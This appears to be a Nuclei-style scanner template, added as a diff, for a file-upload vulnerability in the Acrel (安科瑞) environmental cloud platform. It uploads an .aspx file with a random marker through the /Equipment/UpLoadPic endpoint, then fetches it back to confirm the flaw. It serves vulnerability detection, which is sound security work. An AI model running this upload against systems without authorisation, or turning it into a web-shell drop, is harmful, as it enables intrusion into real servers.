@@ -1,0 +1,49 @@
+id: ankerui-Equipment-UpLoadPic-upload
+
+info:
+  name: 安科瑞智能环保云平台 UpLoadPic 文件上传漏洞
+  author: ankerui
+  severity: high
+  tags: ankerui
+
+http:
+  - raw:
+      - |
+        POST /Equipment/UpLoadPic HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8dc12234dcef
+        Connection: close
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundary8dc12234dcef
+        Content-Disposition: form-data; name="file"; filename="Ec123272.aspx"
+        Content-Type: text/asp
+        
+        {{randstr}}
+        ------WebKitFormBoundary8dc12234dcef--
+
+      - |+
+        GET /UpLoad{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '/UpLoad(.*?\.aspx)"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
